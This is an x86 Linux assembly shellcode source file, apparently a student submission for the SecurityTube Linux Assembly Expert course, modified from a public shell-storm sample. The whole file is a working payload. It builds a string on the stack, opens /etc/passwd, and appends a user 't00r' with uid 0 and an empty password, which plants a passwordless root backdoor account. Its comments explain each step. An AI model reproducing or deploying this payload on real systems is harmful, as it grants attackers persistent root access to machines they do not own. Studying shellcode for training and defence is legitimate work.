; Modified 'append /etc/passwd & exit()' by fbcsec. Original by $andman
; The user t00r with uid 0 and an empty password is appended to the end of /etc/passwd.
; Original: http://shell-storm.org/shellcode/files/shellcode-561.php
; This code was written to fulfill the requirements of the SecurityTube Linux Assembly Expert course:
; http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/index.html
; Student ID: SLAE - 1187


global _start

section .text

_start:
xor ecx, ecx
mul ecx                 ; zero EAX, ECX, and EDX
add eax, 0x05           ; set EAX to the syscall ID for open(2)
push 0x23206873         ; begin PUSHing the string '/etc/passwd#toor::0:0:t00r:/root:/bin/bash #'
mov [esp+3], byte ah    ; Replace the last '#' with \x00
mov [esp+2], byte 0x0a  ; Replace the ' ' at the end of the string to write with a newline character
push 0x61622f6e
push 0x69622f3a
push 0x746f6f72
push 0x2f3a7230
push 0x30743a30
push 0x3a303a3a
push 0x726f6f74
mov edi, esp            ; save pointer to 'toor::0[...] in EDI.
push 0x23647773
mov [esp+3], byte ah    ; Replace the first '#' with \x00
push 0x7361702f
push 0x6374652f         ; string is now carved out
mov ebx, esp            ; save pointer to entire string to ebx

add cx, 0x0442
int 0x80                ; execute open(2)


push eax                ; push the file handle returned by open(2)
pop ebx                 ; pop it into EBX
mov ecx, edi            ; Move into ECX the pointer to 'toor::0[...]' saved in edi.
add dl, 0x1f            ; EDX should be zero, so move the length of the string we're writing into dl.
mov al, 0x04
int 0x80                ; make write(2) syscall


mov al, 0x06
int 0x80                ; make a close(2) syscall using the file descriptor still in EBX

inc eax
int 0x80                ; make an exit(2) syscall to gracefully exit
